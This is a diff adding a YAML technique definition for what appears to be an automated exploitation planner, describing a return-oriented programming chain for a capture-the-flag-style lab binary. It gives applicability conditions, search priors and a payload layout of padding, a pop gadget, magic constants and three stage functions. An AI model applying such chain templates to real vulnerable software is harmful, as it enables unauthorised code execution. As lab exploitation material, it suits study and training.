@@ -1,0 +1,41 @@
+# Lab eval2 twin: the VAULT callme chain (announces NOTHING, no PLT helpers).
+technique: callme_eval2
+author: Gregory Epp
+source: https://github.com/log0u7/lictor-lab
+
+rules:
+  - id: app_callme_eval2
+    head: [applicable, callme_eval2]
+    conditions:
+      - [fact, vuln, sof]
+      - [fact, nx, true]
+      - [fact, pie, false]
+      - [match, gadget, 0, pop_rdi_rsi_rdx]
+
+kb:
+  - id: callme_eval2_001
+    technique: callme_eval2
+    description: >
+      Three gated vault stages (vault_arm/fire/open), each called with its
+      own magic triple via a pop_rdi_rsi_rdx (pop3) gadget. Non-PIE, no
+      banner: stage addresses and the gadget are taken from sym_addr facts.
+    chain: [pop_rdi_rsi_rdx_ret, vault_arm, vault_fire, vault_open]
+    unlocks: [flag]
+    success_rate: 0.9
+
+mcts:
+  requires: []
+  provides: [flag]
+  terminal: true
+  success: 0.85
+
+priors: [10, 1]
+
+build:
+  technique: callme_eval2
+  layout:
+    - [padding, measured_offset]
+    - [chain,
+       "gadget:pop_rdi_rsi_rdx_ret", "const:2712845057", "const:2712845058", "const:2712845059", "sym:vault_arm",
+       "gadget:pop_rdi_rsi_rdx_ret", "const:2712845060", "const:2712845061", "const:2712845062", "sym:vault_fire",
+       "gadget:pop_rdi_rsi_rdx_ret", "const:2712845063", "const:2712845064", "const:2712845065", "sym:vault_open"]
